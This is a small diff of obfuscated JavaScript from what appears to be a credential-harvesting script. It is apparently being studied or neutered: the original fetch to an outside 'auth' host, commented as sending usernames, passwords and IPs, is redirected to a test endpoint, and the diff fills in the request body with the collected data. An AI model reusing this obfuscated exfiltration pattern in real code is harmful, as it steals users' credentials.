@@ -505,7 +505,11 @@ debugger;
                     };
                   //  const Fx = await fetch(eval_G56db.eval_iLLZ(282/*https://www.dualexperience.site/api/auth*/), { // sending stored user info(username, password, ip) to his authentication: ok: true, status 200 for successfull login
                   const Fx = await fetch("https://httpstat.us/200", {
-                      
+                        [eval_G56db.eval_eGGZ(283)]: eval_G56db.eval_Gfg0(284),
+                        [eval_G56db.eval_Cab0(285)]: {
+                            [eval_G56db.eval_y55Z(286)]: eval_G56db.eval_u2x0(287)
+                        },
+                        [eval_G56db.eval_Gfg0(180)]: JSON[eval_G56db.eval_qVVZ(288)](FV)
                     });
                   
                     if (Fx[eval_G56db.eval_mQQZ(289)] === 0xc8) {
